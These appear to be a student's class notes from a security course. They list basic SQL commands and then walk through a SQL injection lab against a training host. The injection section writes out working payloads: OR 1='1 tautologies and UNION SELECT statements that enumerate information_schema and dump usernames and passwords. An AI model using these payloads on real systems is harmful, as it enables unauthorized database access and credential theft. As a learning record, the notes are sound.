SQL ----> Structured Query Language - ANSI Standard

Standard SQL commands
  SELECT
	Extracts data from a database
  UNION
	Used to combine the result-set of two or more SELECT statements
  USE
	Selects the DB to use
  UPDATE
	Updates data in a database
  DELETE
	Deletes data from a database
  INSERT INTO
	Inserts new data into a database
  CREATE DATABASE
	Creates a new database
  ALTER DATABASE
	Modifies a database
  CREATE TABLE
	Creates a new table
  ALTER TABLE
	Modifies a table
  DROP TABLE
	Deletes a table
  CREATE INDEX
	Creates an index (search key)
  DROP INDEX
	Deletes an index
	
  All commands end in a semicolon (;)
  Commands aren't case sensitive but schema names are
  
 2 standard SQL schema, informational and session
 Tables in Information schema we will be using is columns
 
 Demo/////////////
   show tables from session
   show columns from session.Tires;
   (Select from one column)select tired from session.Tires;
   (Select from multiple columns)select tired,name,size,cost from session.Tires;
   
   show tables from session;
   show colums from session;
   
   select tired,name,size,cost from session.Tires union slect id,name,pass from session.user;
                        ^------------                             -----^
             This command won't work because they don't have the same number of columns

DEMO: SQL Injection ////////////////////////////////////////////////
  IP==10.50.35.49 on terminator firefox
  ' in password and username field to check for sanitization
  TOM' OR 1='1 in password and username field
    Use developer tool then go to the network section and redo the login
    then click on the GET request and then switch it to raw
    Then copy and past it into the url as such -----
    
    
    POST Method
    10.50.35.49/Union.html
    Ford' OR 1='1 
    Dodge' OR 1='1
    Honda' OR 1='1
    Audi' OR 1='1   (This one worked)
    
    Audi' UNION SELECT 1,2,3,4; #
    Error because not correct number of colums
    Audi' UNION SELECT 1,2,3,4,5; #
    Now we create golden statement
    Audi' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns; #
    Audi' UNION SELECT tireid,2,name,size,cost FROM session.Tires; #
    Audi' UNION SELECT id,2,name,pass,5 FROM session.user; #
    Audi' UNION SELECT @@version,2,3,4,5; #
    
    GET Method

     	    2 UNION SELECT id,pass,name FROM session.user
     	    2 UNION SELECT id,pass,@@version
    
    DO NOT DROP ANY TABLES!!!!!!!!! HE WILL NOT FIX IT
